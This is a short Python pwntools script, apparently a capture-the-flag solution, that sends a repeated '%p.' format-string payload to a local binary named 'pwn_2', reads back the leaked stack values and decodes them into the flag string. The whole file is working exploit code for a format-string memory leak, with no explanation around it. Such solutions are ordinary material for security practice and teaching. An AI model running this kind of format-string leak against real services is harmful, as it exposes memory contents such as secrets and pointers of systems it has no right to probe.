from pwn import *
import math

payload = b"%p."*(50//3)

p = process("./pwn_2")
p.send(payload+b"\n")
data = p.recv()
data = data.split(b"\n")[-1].split(b".")[5:]

flag = b""
for i in data:
    if i != b"":
        flag += int(i, 16).to_bytes(math.ceil((len(i)-2)/2), 'little')
    if b"}" in flag:
        print(f"Flag : {flag}")
        p.close()
        exit()
p.close()
